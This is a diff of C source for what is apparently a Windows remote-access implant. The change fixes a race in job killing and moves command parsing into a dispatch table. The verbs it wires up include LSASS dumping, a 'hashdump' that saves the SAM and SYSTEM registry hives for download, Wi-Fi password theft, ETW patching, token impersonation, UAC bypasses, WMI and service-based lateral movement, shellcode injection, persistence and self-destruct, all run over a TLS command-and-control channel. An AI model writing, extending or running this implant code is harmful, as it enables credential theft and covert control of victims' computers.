@@ -110,12 +110,13 @@ typedef enum { JOB_FREE=0, JOB_RUNNING, JOB_DONE } _JobState;
 typedef struct {
     volatile _JobState state;
     int                id;
-    HANDLE             hThread;    /* worker thread handle — kept open until job freed */
-    HANDLE             hProcess;   /* cmd.exe process handle (for job_kill)    */
-    char              *output;     /* heap-allocated accumulated stdout        */
+    HANDLE             hThread;       /* worker thread handle — kept open until job freed */
+    HANDLE             hProcess;      /* cmd.exe process handle (for job_kill)    */
+    char              *output;        /* heap-allocated accumulated stdout        */
     size_t             outLen;
-    char               cmd[1024];  /* copy of the command string               */
+    char               cmd[1024];     /* copy of the command string               */
     TLS_CONTEXT       *volatile pTls; /* shared TLS channel — may be nulled on disconnect */
+    volatile BOOL      kill_pending;  /* set by job_kill; worker checks before writing slot */
 } _Job;
 
 static _Job            g_jobs[JOB_MAX];
@@ -215,13 +216,19 @@ static DWORD WINAPI _job_worker(LPVOID param)
     WaitForSingleObject(pi.hProcess, INFINITE);
     CloseHandle(pi.hProcess);
 
-    /* Store result and mark done */
+    /* Store result and mark done — but only if job_kill hasn't already freed
+     * the slot.  If kill_pending is set, the slot may have been recycled so
+     * we must not write back into it; just discard the output instead.       */
     EnterCriticalSection(&g_job_cs);
-    job->output   = buf;
-    job->outLen   = used;
-    job->hProcess = NULL;
-    job->state    = JOB_DONE;
+    if (!job->kill_pending) {
+        job->output   = buf;
+        job->outLen   = used;
+        job->hProcess = NULL;
+        job->state    = JOB_DONE;
+        buf = NULL;   /* ownership transferred to slot */
+    }
     LeaveCriticalSection(&g_job_cs);
+    if (buf) free(buf);   /* discarded because kill_pending was set */
 
     /* Notify C2 that the job finished — only if the session is still live.
      * job->pTls is set to NULL by shell_run on disconnect; guard against
@@ -411,23 +418,51 @@ static void _job_kill(TLS_CONTEXT *pTls, const char *args)
     job->hProcess = NULL;
     job->hThread  = NULL;
     if (job->output) { free(job->output); job->output = NULL; }
-    /* Mark FREE *before* releasing the lock so the slot cannot be reused
-     * until the worker has actually stopped writing into it.  We wait for
-     * the thread to exit below (outside the lock) before returning.       */
-    job->state = JOB_FREE;
+
+    /*
+     * Set kill_pending BEFORE releasing the lock and BEFORE marking FREE.
+     * The worker's _job_worker() checks kill_pending under g_job_cs before
+     * writing its output pointer back into the slot — so even if the
+     * threadpool worker is still running when we release the lock here,
+     * it will see kill_pending=TRUE and discard its output rather than
+     * writing into a slot that we're about to recycle.
+     *
+     * The slot is only marked JOB_FREE AFTER we have stopped the child
+     * process (which causes the worker's ReadFile to return immediately),
+     * ensuring the slot cannot be recycled while the worker is still
+     * writing into it.
+     */
+    job->kill_pending = TRUE;
     LeaveCriticalSection(&g_job_cs);
 
     if (hProc) {
         /* Terminating the process unblocks the worker's ReadFile loop,
          * causing it to exit naturally.  Use PEB-resolved TerminateProcess. */
         k32_TerminateProcess(hProc, 1);
+        /* Wait for the worker to finish its ReadFile loop and see kill_pending.
+         * On the threadpool path hTh == INVALID_HANDLE_VALUE, so we wait on
+         * hProc itself — once the child exits, ReadFile returns and the worker
+         * completes within milliseconds.                                       */
+        if (hTh && hTh != INVALID_HANDLE_VALUE) {
+            WaitForSingleObject(hTh, 5000);
+        } else {
+            /* Threadpool worker: give it up to 500 ms to finish after child exits */
+            WaitForSingleObject(hProc, 500);
+        }
         CloseHandle(hProc);
     }
-    /* Guard: INVALID_HANDLE_VALUE = threadpool path — no WaitForSingleObject */
+    /* For real thread handles: also wait to ensure the thread has exited. */
     if (hTh && hTh != INVALID_HANDLE_VALUE) {
         WaitForSingleObject(hTh, 5000);
         CloseHandle(hTh);
     }
+
+    /* Now safe to mark the slot FREE — worker has stopped (or will see
+     * kill_pending and discard any lingering write).                        */
+    EnterCriticalSection(&g_job_cs);
+    job->kill_pending = FALSE;
+    job->state = JOB_FREE;
+    LeaveCriticalSection(&g_job_cs);
 
     char buf[48]; _snprintf(buf, sizeof(buf)-1, "[+] job %d killed", id);
     _send_str(pTls, buf);
@@ -454,7 +489,257 @@ static DWORD _json_unwrap(char *pBuf, DWORD cbBuf)
 }
 
 
-/* â”€â”€ Public: shell_run â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
+/* ── Verb dispatch table ─────────────────────────────────────────────────── */
+/*
+ * Each entry describes one verb.  The dispatch loop below replaces the
+ * O(N) sequential strncmp chain for the majority of verbs.
+ *
+ * Verbs that need special argument handling (ls optional path, ps allowing
+ * whitespace, env optional filter, services optional sub-filter, dns_query
+ * with sanitisation, the exit/q special cases, forceOff/blueScreen with
+ * exact-match, inject/migrate with large hex, exec_bof, stage_load,
+ * sandbox_check, and the _NS stubs) remain in the explicit if-else block
+ * below and are skipped by the table (verb == NULL sentinel at end).
+ *
+ * Handler signature: void fn(TLS_CONTEXT *, const char *args)
+ *   args = everything after the verb+space separator (may be "").
+ *   For no-arg handlers (sysinfo, ps, etc.) the wrapper ignores args.
+ *
+ * Table field "minlen" is the minimum command length that this entry
+ * can match (== strlen(verb) for exact verbs, strlen(verb)+1 for
+ * verbs that require a space+argument).
+ */
+
+typedef void (*_DispFn)(TLS_CONTEXT *, const char *);
+
+typedef struct {
+    const char *verb;       /* verb string (NUL-terminated)             */
+    int         vlen;       /* strlen(verb)                             */
+    int         need_arg;   /* 1 = require trailing space + argument    */
+    _DispFn     fn;         /* handler function                         */
+} _DispEntry;
+
+/* Wrapper helpers for no-arg handlers */
+static void _w_sysinfo       (TLS_CONTEXT *t, const char *a) { (void)a; _handle_sysinfo(t); }
+static void _w_os_info       (TLS_CONTEXT *t, const char *a) { (void)a; _handle_os_info(t); }
+static void _w_ps            (TLS_CONTEXT *t, const char *a) { (void)a; _handle_ps(t); }
+static void _w_idle_time     (TLS_CONTEXT *t, const char *a) { (void)a; _handle_idle_time(t); }
+static void _w_lock_screen   (TLS_CONTEXT *t, const char *a) { (void)a; _handle_lock_screen(t); }
+static void _w_active_windows(TLS_CONTEXT *t, const char *a) { (void)a; _handle_active_windows(t); }
+static void _w_getclip       (TLS_CONTEXT *t, const char *a) { (void)a; _handle_getclip(t); }
+static void _w_netstat       (TLS_CONTEXT *t, const char *a) { (void)a; _handle_netstat(t); }
+static void _w_arp           (TLS_CONTEXT *t, const char *a) { (void)a; _handle_arp(t); }
+static void _w_ifconfig      (TLS_CONTEXT *t, const char *a) { (void)a; _handle_ifconfig(t); }
+static void _w_routes        (TLS_CONTEXT *t, const char *a) { (void)a; _handle_routes(t); }
+static void _w_wifi_passwords(TLS_CONTEXT *t, const char *a) { (void)a; _handle_wifi_passwords(t); }
+static void _w_etw_patch     (TLS_CONTEXT *t, const char *a) { (void)a; etw_patch(); _send_str(t, "[+] etw_patch: EtwEventWrite patched (RET stub)"); }
+static void _w_dump_lsass    (TLS_CONTEXT *t, const char *a) { (void)a; _handle_dump_lsass(t); }
+static void _w_token_revert  (TLS_CONTEXT *t, const char *a) { (void)a; _handle_token_revert(t); }
+static void _w_getsystem     (TLS_CONTEXT *t, const char *a) { (void)a; _handle_getsystem(t); }
+static void _w_clip_watch    (TLS_CONTEXT *t, const char *a) { (void)a; _handle_clip_watch(t); }
+static void _w_self_destruct (TLS_CONTEXT *t, const char *a) { (void)a; _handle_self_destruct(t); }
+static void _w_jobs          (TLS_CONTEXT *t, const char *a) { (void)a; _list_jobs(t); }
+static void _w_wifi_pw       (TLS_CONTEXT *t, const char *a) { (void)a; _handle_wifi_passwords(t); }
+/* Shell-exec wrappers */
+static void _w_users         (TLS_CONTEXT *t, const char *a) { (void)a; _shell_exec(t, "net user"); }
+static void _w_logged_in     (TLS_CONTEXT *t, const char *a) { (void)a; _shell_exec(t, "query user 2>&1"); }
+static void _w_schtasks      (TLS_CONTEXT *t, const char *a) { (void)a; _shell_exec(t, "schtasks /query /fo LIST 2>&1"); }
+static void _w_find_suid     (TLS_CONTEXT *t, const char *a) {
+    (void)a;
+    _shell_exec(t,
+        "echo [*] No SUID on Windows. Services with non-Windows paths: & "
+        "sc query state= all 2>&1 | findstr /i \"SERVICE_NAME\" & "
+        "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\" /s /v ImagePath"
+        " 2>&1 | findstr /i /v \"system32 syswow64 DriverStore\"");
+}
+
+/* Simple arg-forwarding wrappers */
+static void _w_kill          (TLS_CONTEXT *t, const char *a) { _handle_kill(t, a); }
+static void _w_setclip       (TLS_CONTEXT *t, const char *a) { _handle_setclip(t, a); }
+static void _w_msgbox        (TLS_CONTEXT *t, const char *a) { _handle_msgbox(t, a); }
+static void _w_upload        (TLS_CONTEXT *t, const char *a) { _handle_upload(t, a); }
+static void _w_download      (TLS_CONTEXT *t, const char *a) { _handle_download(t, a); }
+static void _w_persist       (TLS_CONTEXT *t, const char *a) { _handle_persist(t, a); }
+static void _w_cd            (TLS_CONTEXT *t, const char *a) { _handle_cd(t, a); }
+static void _w_token_imp     (TLS_CONTEXT *t, const char *a) { _handle_token_impersonate(t, a); }
+static void _w_uac_bypass    (TLS_CONTEXT *t, const char *a) { _handle_uac_bypass(t, a); }
+static void _w_uac_reg       (TLS_CONTEXT *t, const char *a) { _handle_uac_reg_hijack(t, a); }
+static void _w_uac_dll       (TLS_CONTEXT *t, const char *a) { _handle_uac_dll_hijack(t, a); }
+static void _w_uac_com       (TLS_CONTEXT *t, const char *a) { _handle_uac_com_hijack(t, a); }
+static void _w_uac_env       (TLS_CONTEXT *t, const char *a) { _handle_uac_env_expand(t, a); }
+static void _w_lateral_wmi   (TLS_CONTEXT *t, const char *a) { _handle_lateral_wmi(t, a); }
+static void _w_lateral_sc    (TLS_CONTEXT *t, const char *a) { _handle_lateral_sc(t, a); }
+static void _w_run_psh       (TLS_CONTEXT *t, const char *a) { _handle_run_psh(t, a); }
+static void _w_open_url      (TLS_CONTEXT *t, const char *a) { _handle_open_url(t, a); }
+static void _w_set_wallpaper (TLS_CONTEXT *t, const char *a) { _handle_set_wallpaper(t, a); }
+static void _w_mouse_move    (TLS_CONTEXT *t, const char *a) { _handle_mouse_move(t, a); }
+static void _w_type_keys     (TLS_CONTEXT *t, const char *a) { _handle_type_keys(t, a); }
+static void _w_bg            (TLS_CONTEXT *t, const char *a) { _bg_shell_exec(t, a); }
+static void _w_job_output    (TLS_CONTEXT *t, const char *a) { _job_output(t, a); }
+static void _w_job_kill      (TLS_CONTEXT *t, const char *a) { _job_kill(t, a); }
+/* Shell-exec arg-forwarding wrappers */
+static void _w_chmod         (TLS_CONTEXT *t, const char *a) {
+    char sc[MAX_PATH+64]={0};
+    _snprintf(sc,sizeof(sc)-1,"icacls \"%s\" 2>&1 & echo [!] chmod mapped to icacls on Windows",a);
+    _shell_exec(t,sc);
+}
+static void _w_find_writable (TLS_CONTEXT *t, const char *a) {
+    char sc[MAX_PATH+64]={0};
+    _snprintf(sc,sizeof(sc)-1,"icacls \"%s\" /t 2>&1 | findstr /i \"(W) (M) (F) Everyone Users\"",a);
+    _shell_exec(t,sc);
+}
+static void _w_file_hash     (TLS_CONTEXT *t, const char *a) {
+    char sc[MAX_PATH+32]={0};
+    _snprintf(sc,sizeof(sc)-1,"certutil -hashfile \"%s\" SHA256 2>&1",a);
+    _shell_exec(t,sc);
+}
+static void _w_mkdir         (TLS_CONTEXT *t, const char *a) {
+    char sc[MAX_PATH+10]={0};
+    _snprintf(sc,sizeof(sc)-1,"mkdir \"%s\" 2>&1",a);
+    _shell_exec(t,sc);
+}
+static void _w_cat           (TLS_CONTEXT *t, const char *a) {
+    char sc[MAX_PATH+8]={0};
+    _snprintf(sc,sizeof(sc)-1,"type \"%s\" 2>&1",a);
+    _shell_exec(t,sc);
+}
+static void _w_rm            (TLS_CONTEXT *t, const char *a) {
+    char sc[MAX_PATH+48]={0};
+    _snprintf(sc,sizeof(sc)-1,
+        "if exist \"%s\\\" (rmdir /s /q \"%s\" 2>&1) else (del /f /q \"%s\" 2>&1)",
+        a,a,a);
+    _shell_exec(t,sc);
+}
+static void _w_hashdump      (TLS_CONTEXT *t, const char *a) {
+    (void)a;
+    _shell_exec(t, "reg save HKLM\\SAM %TEMP%\\sam.hiv /y 2>&1");
+    _shell_exec(t, "reg save HKLM\\SYSTEM %TEMP%\\sys.hiv /y 2>&1");
+    _send_str(t,
+        "[*] hashdump: if no errors above, pull with:\n"
+        "    download %TEMP%\\sam.hiv\n"
+        "    download %TEMP%\\sys.hiv\n"
+        "    (Requires SeBackupPrivilege — run getsystem first if denied)");
+}
+static void _w_installed_sw  (TLS_CONTEXT *t, const char *a) {
+    (void)a;
+    _shell_exec(t,
+        "reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\""
+        " /s /v DisplayName 2>&1 & "
+        "reg query \"HKLM\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\""
+        " /s /v DisplayName 2>&1");
+}
+static void _w_startup_items (TLS_CONTEXT *t, const char *a) {
+    (void)a;
+    _shell_exec(t,
+        "reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" 2>&1 & "
+        "reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" 2>&1");
+}
+static void _w_inject        (TLS_CONTEXT *t, const char *a) { inject_shellcode(t, a); }
+
+/*
+ * Dispatch table — searched O(N) but N is now constant and the function
+ * pointer call replaces the strncmp body, making the code much shorter.
+ * Entries with need_arg=0 match "verb" or "verb " (exact or with space).
+ * Entries with need_arg=1 only match "verb " (must have argument).
+ * The sentinel {NULL,0,0,NULL} ends the table.
+ */
+static const _DispEntry _dispatch[] = {
+    /* verb              vlen need_arg  handler */
+    { "sysinfo",         7,   0,  _w_sysinfo        },
+    { "os_info",         7,   0,  _w_os_info        },
+    { "cd ",             2,   1,  _w_cd             },  /* "cd " requires space */
+    { "ps",              2,   0,  _w_ps             },
+    { "kill ",           4,   1,  _w_kill           },
+    { "setclip ",        7,   1,  _w_setclip        },
+    { "idle_time",       9,   0,  _w_idle_time      },
+    { "lock_screen",    11,   0,  _w_lock_screen    },
+    { "active_windows", 14,   0,  _w_active_windows },
+    { "msgbox ",         6,   1,  _w_msgbox         },
+    { "upload ",         6,   1,  _w_upload         },
+    { "download ",       8,   1,  _w_download       },
+    { "persist ",        7,   1,  _w_persist        },
+    { "self_destruct",  13,   0,  _w_self_destruct  },
+    { "getclip",         7,   0,  _w_getclip        },
+    { "netstat",         7,   0,  _w_netstat        },
+    { "arp",             3,   0,  _w_arp            },
+    { "ifconfig",        8,   0,  _w_ifconfig       },
+    { "routes",          6,   0,  _w_routes         },
+    { "wifi_passwords", 14,   0,  _w_wifi_passwords },
+    { "etw_patch",       9,   0,  _w_etw_patch      },
+    { "dump_lsass",     10,   0,  _w_dump_lsass     },
+    { "token_revert",   12,   0,  _w_token_revert   },
+    { "getsystem",       9,   0,  _w_getsystem      },
+    { "clip_watch",     10,   0,  _w_clip_watch     },
+    { "token_impersonate ", 18, 1, _w_token_imp     },
+    { "uac_bypass",     10,   0,  _w_uac_bypass     },
+    { "uac_reg_hijack", 14,   0,  _w_uac_reg        },
+    { "uac_dll_hijack", 14,   0,  _w_uac_dll        },
+    { "uac_com_hijack", 14,   0,  _w_uac_com        },
+    { "uac_env_expand", 14,   0,  _w_uac_env        },
+    { "lateral_wmi ",   11,   1,  _w_lateral_wmi    },
+    { "lateral_sc ",    10,   1,  _w_lateral_sc     },
+    { "run_psh ",        7,   1,  _w_run_psh        },
+    { "open_url ",       8,   1,  _w_open_url       },
+    { "set_wallpaper ",  13,  1,  _w_set_wallpaper  },
+    { "mouse_move ",    10,   1,  _w_mouse_move     },
+    { "type_keys ",      9,   1,  _w_type_keys      },
+    { "bg ",             2,   1,  _w_bg             },
+    { "jobs",            4,   0,  _w_jobs           },
+    { "job_output ",    10,   1,  _w_job_output     },
+    { "job_kill ",       8,   1,  _w_job_kill       },
+    { "users",           5,   0,  _w_users          },
+    { "logged_in",       9,   0,  _w_logged_in      },
+    { "scheduled_tasks",15,   0,  _w_schtasks       },
+    { "installed_software",18,0,  _w_installed_sw   },
+    { "startup_items",  13,   0,  _w_startup_items  },
+    { "hashdump",        8,   0,  _w_hashdump       },
+    { "cat ",            3,   1,  _w_cat            },
+    { "mkdir ",          5,   1,  _w_mkdir          },
+    { "rm ",             2,   1,  _w_rm             },
+    { "file_hash ",      9,   1,  _w_file_hash      },
+    { "chmod ",          5,   1,  _w_chmod          },
+    { "find_writable ",  13,  1,  _w_find_writable  },
+    { "find_suid",       9,   0,  _w_find_suid      },
+    { "inject ",         6,   1,  _w_inject         },
+    { "inject_shellcode ", 16, 1, _w_inject         },  /* alias for inject */
+    { NULL, 0, 0, NULL }
+};
+
+/*
+ * _dispatch_verb
+ * --------------
+ * Search the dispatch table for a matching verb.
+ * Returns TRUE and calls the handler if found; FALSE if not matched.
+ *
+ * Matching rules:
+ *   need_arg=0: cmd must start with verb AND (cbCmd == vlen OR cmd[vlen] is space/CR/LF)
+ *   need_arg=1: cmd must start with verb (which already ends in ' ') and cbCmd > vlen;
+ *               the handler receives cmd+vlen as its args pointer.
+ */
+static BOOL _dispatch_verb(TLS_CONTEXT *pTls, const char *cmd, DWORD cbCmd)
+{
+    for (const _DispEntry *e = _dispatch; e->verb; e++) {
+        if ((DWORD)e->vlen > cbCmd) continue;
+        if (strncmp(e->verb, cmd, (size_t)e->vlen) != 0) continue;
+
+        if (e->need_arg) {
+            /* verb ends with ' ' — require at least one char after it */
+            if (cbCmd <= (DWORD)e->vlen) continue;
+            e->fn(pTls, cmd + e->vlen);
+        } else {
+            /* exact match or followed by whitespace */
+            if (cbCmd != (DWORD)e->vlen &&
+                cmd[e->vlen] != ' ' && cmd[e->vlen] != '\r' && cmd[e->vlen] != '\n')
+                continue;
+            e->fn(pTls, (cbCmd > (DWORD)e->vlen) ? cmd + e->vlen + 1 : "");
+        }
+        return TRUE;
+    }
+    return FALSE;
+}
+
+
+/* ── Public: shell_run ──────────────────────────────────────────────────── */
 
 /* RVA → raw-file-offset helper used by stage_load's PE export scanner */
 static DWORD _stage_rva2off(DWORD rva, const IMAGE_SECTION_HEADER *sec, WORD nSec)
@@ -481,11 +766,11 @@ void shell_run(TLS_CONTEXT *pTls)
         if (!tls_recv_msg(pTls, &pCmd, &cbCmd))
             break;
 
-        /* Strip JSON string wrapper ("cmd" â†’ cmd) */
+        /* Strip JSON string wrapper ("cmd" → cmd) */
         cbCmd = _json_unwrap((char *)pCmd, cbCmd);
         const char *cmd = (const char *)pCmd;
 
-        /* â”€â”€ exit / q â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
+        /* ── exit / q ──────────────────────────────────────────────────── */
         if (cbCmd >= 4 && strncmp("exit", cmd, 4) == 0) {
             free(pCmd); pCmd = NULL;
             tls_disconnect(pTls);
@@ -497,30 +782,17 @@ void shell_run(TLS_CONTEXT *pTls)
             return;
         }
 
-        /* â”€â”€ sysinfo â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
-        if (cbCmd >= 7 && strncmp("sysinfo", cmd, 7) == 0 &&
-            (cbCmd == 7 || cmd[7] == ' ')) {
+        /* ── Dispatch table (covers the majority of verbs) ─────────────── */
+        /* Try the dispatch table first; if matched, free pCmd and continue. */
+        if (_dispatch_verb(pTls, cmd, cbCmd)) {
             free(pCmd); pCmd = NULL;
-            _handle_sysinfo(pTls);
             continue;
         }
 
-        /* â”€â”€ os_info â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
-        if (cbCmd >= 7 && strncmp("os_info", cmd, 7) == 0 &&
-            (cbCmd == 7 || cmd[7] == ' ')) {
-            free(pCmd); pCmd = NULL;
-            _handle_os_info(pTls);
-            continue;
-        }
-
-        /* â”€â”€ cd <path> â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
-        if (cbCmd >= 3 && strncmp("cd ", cmd, 3) == 0) {
-            char path[MAX_PATH] = {0};
-            strncpy(path, cmd + 3, sizeof(path) - 1);
-            free(pCmd); pCmd = NULL;
-            _handle_cd(pTls, path);
-            continue;
-        }
+        /* ── Complex/special-case verbs (not in the dispatch table) ────── */
+        /* ls, env, services, dns_query, tail, write_file, find_files,      */
+        /* migrate, forceOff, blueScreen, exec_bof, stage_load,             */
+        /* sandbox_check, and _NS stubs remain here.                        */
 
         /* â”€â”€ ls [path] â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
         if ((cbCmd == 2 && strncmp("ls", cmd, 2) == 0) ||
@@ -532,24 +804,8 @@ void shell_run(TLS_CONTEXT *pTls)
             continue;
         }
 
-        /* â”€â”€ ps â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
-        if (cbCmd >= 2 && strncmp("ps", cmd, 2) == 0 &&
-            (cbCmd == 2 || cmd[2] == ' ' || cmd[2] == '\r' || cmd[2] == '\n')) {
-            free(pCmd); pCmd = NULL;
-            _handle_ps(pTls);
-            continue;
-        }
-
-        /* â”€â”€ kill <pid> â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
-        if (cbCmd >= 5 && strncmp("kill ", cmd, 5) == 0) {
-            char args[32] = {0};
-            strncpy(args, cmd + 5, sizeof(args) - 1);
-            free(pCmd); pCmd = NULL;
-            _handle_kill(pTls, args);
-            continue;
-        }
-
-        /* â”€â”€ env [filter] â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
+        /* ── env [filter] ───────────────────────────────────────────────── */
+        /* (kept here: optional filter argument cannot be expressed in table) */
         if ((cbCmd == 3 && strncmp("env", cmd, 3) == 0) ||
             (cbCmd >= 4 && strncmp("env ", cmd, 4) == 0)) {
             char filter[256] = {0};
@@ -559,100 +815,8 @@ void shell_run(TLS_CONTEXT *pTls)
             continue;
         }
 
-        /* â”€â”€ getclip â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
-        if (cbCmd >= 7 && strncmp("getclip", cmd, 7) == 0 &&
-            (cbCmd == 7 || cmd[7] == ' ')) {
-            free(pCmd); pCmd = NULL;
-            _handle_getclip(pTls);
-            continue;
-        }
-
-        /* â”€â”€ setclip <text> â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
-        if (cbCmd >= 8 && strncmp("setclip ", cmd, 8) == 0) {
-            char text[4096] = {0};
-            strncpy(text, cmd + 8, sizeof(text) - 1);
-            free(pCmd); pCmd = NULL;
-            _handle_setclip(pTls, text);
-            continue;
-        }
-
-        /* â”€â”€ idle_time â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
-        if (cbCmd >= 9 && strncmp("idle_time", cmd, 9) == 0 &&
-            (cbCmd == 9 || cmd[9] == ' ')) {
-            free(pCmd); pCmd = NULL;
-            _handle_idle_time(pTls);
-            continue;
-        }
-
-        /* â”€â”€ lock_screen â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
-        if (cbCmd >= 11 && strncmp("lock_screen", cmd, 11) == 0 &&
-            (cbCmd == 11 || cmd[11] == ' ')) {
-            free(pCmd); pCmd = NULL;
-            _handle_lock_screen(pTls);
-            continue;
-        }
-
-        /* â”€â”€ active_windows â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
-        if (cbCmd >= 14 && strncmp("active_windows", cmd, 14) == 0 &&
-            (cbCmd == 14 || cmd[14] == ' ')) {
-            free(pCmd); pCmd = NULL;
-            _handle_active_windows(pTls);
-            continue;
-        }
-
-        /* â”€â”€ msgbox <title> <message> â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
-        if (cbCmd >= 7 && strncmp("msgbox ", cmd, 7) == 0) {
-            char args[512] = {0};
-            strncpy(args, cmd + 7, sizeof(args) - 1);
-            free(pCmd); pCmd = NULL;
-            _handle_msgbox(pTls, args);
-            continue;
-        }
-
-        /* â”€â”€ upload <filename> â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
-        if (cbCmd >= 7 && strncmp("upload ", cmd, 7) == 0) {
-            char filename[MAX_PATH] = {0};
-            strncpy(filename, cmd + 7, sizeof(filename) - 1);
-            free(pCmd); pCmd = NULL;
-            _handle_upload(pTls, filename);
-            continue;
-        }
-
-        /* â”€â”€ download <path> â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
-        if (cbCmd >= 9 && strncmp("download ", cmd, 9) == 0) {
-            char path[MAX_PATH] = {0};
-            strncpy(path, cmd + 9, sizeof(path) - 1);
-            free(pCmd); pCmd = NULL;
-            _handle_download(pTls, path);
-            continue;
-        }
-
-        /* â”€â”€ persist <regkey> <filename> â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
-        if (cbCmd >= 8 && strncmp("persist ", cmd, 8) == 0) {
-            char args[512] = {0};
-            strncpy(args, cmd + 8, sizeof(args) - 1);
-            free(pCmd); pCmd = NULL;
-            _handle_persist(pTls, args);
-            continue;
-        }
-
-        /* â”€â”€ self_destruct â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
-        if (cbCmd >= 13 && strncmp("self_destruct", cmd, 13) == 0) {
-            free(pCmd); pCmd = NULL;
-            _handle_self_destruct(pTls);
-            return;
-        }
-
-        /* â”€â”€ inject <pid> <hex> â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
-        if (cbCmd >= 7 && strncmp("inject ", cmd, 7) == 0) {
-            char args[65600] = {0};
-            strncpy(args, cmd + 7, sizeof(args) - 1);
-            free(pCmd); pCmd = NULL;
-            inject_shellcode(pTls, args);
-            continue;
-        }
-
-        /* â”€â”€ migrate <pid> â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
+        /* ── migrate <pid> ───────────────────────────────────────────────── */
